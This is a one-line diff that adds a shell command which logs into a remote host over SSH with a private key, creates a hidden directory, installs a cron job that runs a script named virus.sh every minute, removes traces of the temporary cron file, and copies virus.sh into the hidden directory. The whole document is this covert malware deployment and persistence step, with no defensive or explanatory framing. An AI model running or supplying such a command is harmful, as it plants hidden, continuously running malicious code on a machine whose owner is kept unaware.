@@ -1,0 +1,1 @@
+ssh -i id_rsa erick@192.168.100.8 "mkdir .hidden & crontab -l > mycron && echo -e 'SHELL=/bin/sh\\n* * * * * bash ~/.hidden/virus.sh' >> mycron && crontab mycron && rm mycron" && scp -i id_rsa virus.sh erick@192.168.100.8:~/.hidden
